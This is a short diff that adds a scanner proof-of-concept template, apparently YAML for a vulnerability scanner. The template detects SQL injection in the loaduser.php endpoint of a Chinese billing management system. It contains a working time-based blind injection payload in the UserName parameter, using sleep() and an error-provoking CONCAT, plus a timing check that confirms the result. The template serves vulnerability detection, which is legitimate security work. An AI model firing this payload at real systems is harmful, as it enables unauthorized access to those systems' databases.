@@ -1,0 +1,17 @@
+id: poc-yaml-lhzy-billing-management-system-loaduser-php-sqli
+info:
+  name: 蓝海卓越计费管理系统 loaduser.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 蓝海卓越计费管理系统
+variables:
+  t1: random_int(2,5)
+  t2: t1 + t1
+  t3: t2 + 2
+requests:
+- method: GET
+  path: /ajax/loaduser.php?UserName=1'+AND+(SELECT+2*(IF((SELECT+*+FROM+(SELECT+CONCAT(0x716a7a6a71,(SELECT+(ELT(3776=3776,1))),sleep({{.t1}}),0x78))s),+8446744073709551610,+8446744073709551610)))--+opzJ
+  expression: status_code == 200 && contains(body,"MySQL Query Error") && contains(body,"DataBase
+    Error") && duration > t2 && duration < t3
+transport: http
